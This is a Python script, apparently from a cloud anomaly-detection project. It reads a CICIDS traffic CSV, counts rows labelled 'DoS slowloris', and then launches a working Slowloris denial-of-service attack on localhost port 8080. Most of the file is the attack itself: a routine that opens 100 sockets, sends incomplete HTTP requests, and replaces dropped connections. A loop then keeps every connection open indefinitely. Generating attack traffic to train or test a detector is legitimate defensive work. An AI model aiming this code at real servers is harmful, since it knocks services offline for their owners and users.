import socket
import random
import time
import sys
import pandas as pd

# List of columns to be read from the CSV file
COLUMNS = [
    "Destination Port", "Flow Duration", "Total Fwd Packets", "Total Backward Packets", 
    "Total Length of Fwd Packets", "Total Length of Bwd Packets", "Fwd Packet Length Max", 
    "Fwd Packet Length Min", "Fwd Packet Length Mean", "Fwd Packet Length Std", 
    "Bwd Packet Length Max", "Bwd Packet Length Min", "Bwd Packet Length Mean", 
    "Bwd Packet Length Std", "Flow Bytes/s", "Flow Packets/s", "Flow IAT Mean", 
    "Flow IAT Std", "Flow IAT Max", "Flow IAT Min", "Fwd IAT Total", "Fwd IAT Mean", 
    "Fwd IAT Std", "Fwd IAT Max", "Fwd IAT Min", "Bwd IAT Total", "Bwd IAT Mean", 
    "Bwd IAT Std", "Bwd IAT Max", "Bwd IAT Min", "Label", "Protocol"
]

DATA_FILE = r"E:\CloudAnomalyDetectionSystem\data\train\Wednesday-workingHours.pcap_ISCX.csv"

def load_dos_slowloris_data(file_path):
    """
    Reads the specified CSV file, selects the defined columns,
    and filters rows where Label == "DoS slowloris".
    """
    try:
        df = pd.read_csv(file_path, usecols=COLUMNS)
        slowloris_df = df[df["Label"] == "DoS slowloris"]
        return slowloris_df
    except Exception as e:
        print(f"Error reading {file_path}: {e}")
        return pd.DataFrame()

def create_socket(target_host="127.0.0.1", target_port=8080):
    """Creates a socket and connects to the target."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((target_host, target_port))
        sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
        sock.send(f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode("utf-8"))
        sock.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
        return sock
    except socket.error as e:
        print(f"Failed to create socket: {e}")
        return None

def slowloris_attack(target_host="127.0.0.1", target_port=8080, num_sockets=100):
    """
    Simulates a Slowloris DoS attack by keeping multiple connections open.
    """
    print(f"Starting Slowloris attack on {target_host}:{target_port}")
    socket_list = []

    try:
        # Create initial connections
        for _ in range(num_sockets):
            sock = create_socket(target_host, target_port)
            if sock:
                socket_list.append(sock)
                print(f"Created socket {len(socket_list)}")
            time.sleep(0.1)

        # Keep connections alive
        while True:
            print(f"Sending keep-alive headers... Socket count: {len(socket_list)}")
            for sock in list(socket_list):
                try:
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                except socket.error:
                    socket_list.remove(sock)
                    new_sock = create_socket(target_host, target_port)
                    if new_sock:
                        socket_list.append(new_sock)
                        print("Recreated dead socket")
            
            # Create new sockets if some died
            while len(socket_list) < num_sockets:
                sock = create_socket(target_host, target_port)
                if sock:
                    socket_list.append(sock)
                    print("Recreated dead socket")
            
            time.sleep(15)  # Wait between keep-alive packets

    except KeyboardInterrupt:
        print("\nSlowloris attack stopped by user")
    finally:
        # Clean up sockets
        for sock in socket_list:
            sock.close()
        sys.exit(0)

def main():
    # Load and filter data for DoS slowloris records
    slowloris_data = load_dos_slowloris_data(DATA_FILE)
    if slowloris_data.empty:
        print("No records labeled 'DoS slowloris' found in the dataset.")
    else:
        print(f"Total DoS slowloris records found: {len(slowloris_data)}")
    
    # Fixed target port 8080 regardless of CSV content
    target_port = 8080
    
    # Start the Slowloris attack using fixed host and port
    slowloris_attack(target_host="127.0.0.1", target_port=target_port, num_sockets=100)

if __name__ == "__main__":
    main()
